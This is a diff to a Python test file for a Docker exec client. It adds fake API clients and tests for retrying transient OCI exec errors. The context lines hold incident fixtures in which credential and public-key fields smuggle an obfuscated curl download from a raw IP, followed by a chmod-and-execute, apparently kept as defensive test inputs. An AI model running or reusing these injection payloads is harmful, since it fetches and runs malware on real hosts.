@@ -34,6 +34,17 @@ INCIDENT_DOCKER_PASSWORD = (
     "&&chmod +x /tmp/mney && /tmp/mney   |echo '"
 )
 INCIDENT_PUBLIC_KEY = "';  c'u'''''r\\l'''' -o /tmp/systemd 203.23.128.30:443/linux_wss;'"
+SETNS_OCI_EXEC_ERROR = (
+    "OCI runtime exec failed: exec failed: container_linux.go:439: "
+    "starting container process caused: process_linux.go:119: "
+    "executing setns process caused: exit status 1\r\n"
+)
+CGROUP_OCI_EXEC_ERROR = (
+    "OCI runtime exec failed: exec failed: container_linux.go:439: "
+    "starting container process caused: process_linux.go:140: adding pid 123 "
+    "to cgroups caused: failed to write 123: openat2 "
+    "/sys/fs/cgroup/init.scope (deleted)/cgroup.procs: no such file or directory\r\n"
+)
 
 
 class FakeApiClient:
@@ -158,6 +169,41 @@ class OtherConflictExecCreateApiClient(FakeApiClient):
     def exec_create(self, **kwargs):
         self.exec_created.append(kwargs)
         raise _other_conflict_error()
+
+
+class ExecResultApiClient(FakeApiClient):
+    def __init__(
+        self,
+        *,
+        failing_stdout: str,
+        failing_exit_status: int,
+        remaining_failures: int = 1,
+    ):
+        super().__init__()
+        self.failing_stdout = failing_stdout
+        self.failing_exit_status = failing_exit_status
+        self.remaining_failures = remaining_failures
+        self.failed_exec_ids = set()
+        self.next_exec_id = 0
+
+    def exec_create(self, **kwargs):
+        self.exec_created.append(kwargs)
+        self.next_exec_id += 1
+        return {"Id": f"exec-id-{self.next_exec_id}"}
+
+    def exec_start(self, exec_id, **kwargs):
+        self.exec_started.append((exec_id, kwargs))
+        if self.remaining_failures:
+            self.remaining_failures -= 1
+            self.failed_exec_ids.add(exec_id)
+            return (self.failing_stdout.encode(), b"")
+        return (b"stdout", b"stderr")
+
+    def exec_inspect(self, exec_id):
+        self.exec_inspected.append(exec_id)
+        if exec_id in self.failed_exec_ids:
+            return {"ExitCode": self.failing_exit_status}
+        return {"ExitCode": 0}
 
 
 class SocketExecApiClient(FakeApiClient):
@@ -544,6 +590,99 @@ async def test_exec_in_container_does_not_retry_other_conflicts(monkeypatch):
             )
         )
 
+    assert len(api_client.exec_created) == 1
+    assert api_client.containers_inspected == []
+
+
+@pytest.mark.parametrize(
+    "transient_stdout",
+    [
+        SETNS_OCI_EXEC_ERROR,
+        CGROUP_OCI_EXEC_ERROR,
+    ],
+)
+@pytest.mark.asyncio
+async def test_exec_in_container_retries_transient_oci_exec_result(
+    monkeypatch,
+    transient_stdout,
+):
+    monkeypatch.setattr(
+        rental_docker_sdk,
+        "_DOCKER_EXEC_RESTART_RETRY_DELAYS_SECONDS",
+        (5,),
+    )
+    api_client = ExecResultApiClient(
+        failing_stdout=transient_stdout,
+        failing_exit_status=128,
+    )
+    client = RentalDockerSdkClient(api_client)
+
+    result = await client.exec_in_container(
+        ContainerExecSpec(
+            container_name="pod_exec",
+            argv=("sh", "-c", "cat /tmp/file"),
+        )
+    )
+
+    assert result.exit_status == 0
+    assert result.stdout == "stdout"
+    assert len(api_client.exec_created) == 2
+    assert api_client.exec_started == [
+        ("exec-id-1", {"demux": True}),
+        ("exec-id-2", {"demux": True}),
+    ]
+    assert api_client.containers_inspected == ["pod_exec"]
+
+
+@pytest.mark.asyncio
+async def test_exec_in_container_returns_transient_oci_result_after_retry_budget(monkeypatch):
+    monkeypatch.setattr(
+        rental_docker_sdk,
+        "_DOCKER_EXEC_RESTART_RETRY_DELAYS_SECONDS",
+        (5, 5),
+    )
+    api_client = ExecResultApiClient(
+        failing_stdout=SETNS_OCI_EXEC_ERROR,
+        failing_exit_status=128,
+        remaining_failures=10,
+    )
+    client = RentalDockerSdkClient(api_client)
+
+    result = await client.exec_in_container(
+        ContainerExecSpec(
+            container_name="pod_exec",
+            argv=("sh", "-c", "cat /tmp/file"),
+        )
+    )
+
+    assert result.exit_status == 128
+    assert result.stdout == SETNS_OCI_EXEC_ERROR
+    assert len(api_client.exec_created) == 3
+    assert api_client.containers_inspected == ["pod_exec", "pod_exec"]
+
+
+@pytest.mark.asyncio
+async def test_exec_in_container_does_not_retry_non_transient_oci_result(monkeypatch):
+    monkeypatch.setattr(
+        rental_docker_sdk,
+        "_DOCKER_EXEC_RESTART_RETRY_DELAYS_SECONDS",
+        (0, 0),
+    )
+    api_client = ExecResultApiClient(
+        failing_stdout='OCI runtime exec failed: exec: "missing": executable file not found\r\n',
+        failing_exit_status=127,
+        remaining_failures=1,
+    )
+    client = RentalDockerSdkClient(api_client)
+
+    result = await client.exec_in_container(
+        ContainerExecSpec(
+            container_name="pod_exec",
+            argv=("missing",),
+        )
+    )
+
+    assert result.exit_status == 127
     assert len(api_client.exec_created) == 1
     assert api_client.containers_inspected == []
 
